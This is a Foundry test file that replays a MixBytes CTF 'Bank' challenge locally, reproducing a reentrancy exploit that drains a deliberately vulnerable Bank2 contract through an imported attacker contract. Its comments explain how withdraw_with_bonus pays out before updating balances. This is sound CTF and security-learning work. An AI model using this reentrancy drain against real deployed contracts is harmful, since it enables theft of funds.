// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Bank/Bank2.sol";
import "../contracts/Bank/BankAttack.sol";

/// @title Bank2 reentrancy exploit reproduction
/// @notice MixBytes Farm CTF (2022-2023) - "Bank" challenge, replayed locally
///         against a vm-managed chain since the original Goerli testnet is gone.
/// @dev assumption: the original DIRECTOR deposit amount used on Goerli was lost
///      together with the testnet. We assume it was 0.01 ether here; the exploit
///      logic (reentrancy in Bank2.withdraw_with_bonus via the unchecked low-level
///      `call`) does not depend on this specific value, only on the contract
///      balance ending up strictly below it.
/// @dev Bank2.sol and BankAttack.sol are intentionally vulnerable / pre-written
///      challenge contracts and are NOT modified by this test.
contract Bank2Test is Test {
    // Hardcoded in Bank2's constructor - the "beloved DIRECTOR" of the bank.
    address constant DIRECTOR = 0xd3C2b1b1096729b7e1A13EfC76614c649Ba96F34;

    // @dev assumption: original director deposit value (see contract NatSpec above).
    uint256 constant DIRECTOR_DEPOSIT = 0.01 ether;

    Bank2 bank;
    BankAttack attack;
    address player;

    function setUp() public {
        player = makeAddr("player");

        // Deploy Bank2, funding it with the (assumed) director's initial deposit.
        bank = new Bank2{value: DIRECTOR_DEPOSIT}();

        // BankAttack is Ownable; deploy it from `player` so player owns it and
        // can call the onlyOwner hack1/hack2/withdraw functions.
        vm.prank(player);
        attack = new BankAttack(payable(address(bank)));

        // Give the player and the attack contract some ETH to work with.
        vm.deal(player, 1 ether);
    }

    function test_DrainBankBelowDirectorDepositAndCompleteChallenge() public {
        console.log("=== Initial state ===");
        console.log("Bank2 balance       :", address(bank).balance);
        console.log("Director deposit    :", bank.balanceOfETH(DIRECTOR));
        console.log("BankAttack balance  :", address(attack).balance);
        assertEq(address(bank).balance, DIRECTOR_DEPOSIT, "bank should start funded with director deposit");
        assertFalse(bank.completed(), "challenge should not be completed yet");

        // --- Step 1: hack1 -------------------------------------------------
        // BankAttack.hack1 forwards ETH to Bank2 via a raw call, which lands
        // in Bank2.receive(), crediting _balances[attack] > 0. This is a
        // prerequisite for giveBonusToUser/withdraw_with_bonus to accept the
        // attacker contract as a caller.
        uint256 depositAmount = 0.01 ether;
        vm.prank(player);
        attack.hack1{value: depositAmount}();

        console.log("=== After hack1 (deposit) ===");
        console.log("Bank2 balance       :", address(bank).balance);
        console.log("Attack bal in Bank2 :", bank.balanceOfETH(address(attack)));
        assertEq(
            address(bank).balance,
            DIRECTOR_DEPOSIT + depositAmount,
            "bank balance should grow by deposit"
        );
        assertGt(bank.balanceOfETH(address(attack)), 0, "attack contract must have a recorded balance in Bank2");

        // --- Step 2: hack2 -------------------------------------------------
        // BankAttack.hack2 calls Bank2.giveBonusToUser(self) with `msg.value`
        // as the bonus, then immediately calls Bank2.withdraw_with_bonus().
        // withdraw_with_bonus() pays the bonus out via a low-level `call`
        // *before* zeroing `_bonuses_for_users` and `_balances`. That call
        // reenters BankAttack.receive(), which - as long as Bank2 still holds
        // ETH - calls withdraw_with_bonus() again. Because the bookkeeping
        // hasn't been updated yet, each reentrant call is paid the same
        // bonus again, draining Bank2 far beyond what was ever deposited.
        uint256 bonusAmount = 0.005 ether;
        vm.prank(player);
        attack.hack2{value: bonusAmount}();

        console.log("=== After hack2 (reentrancy drain) ===");
        console.log("Bank2 balance       :", address(bank).balance);
        console.log("BankAttack balance  :", address(attack).balance);

        assertLt(
            address(bank).balance,
            bank.balanceOfETH(DIRECTOR),
            "Bank2 balance must drop below director's deposit for the exploit to work"
        );

        // --- Step 3: claim the win ------------------------------------------
        bank.setCompleted(true);

        console.log("=== Final state ===");
        console.log("Bank2 balance       :", address(bank).balance);
        console.log("completed()         :", bank.completed());

        assertTrue(bank.completed(), "challenge should be marked completed");

        // Sanity: the attacker can also sweep whatever landed in BankAttack.
        vm.prank(player);
        attack.withdraw();
        console.log("Player balance after withdraw:", player.balance);
        assertGt(player.balance, 1 ether, "player should have profited from the exploit");
    }
}
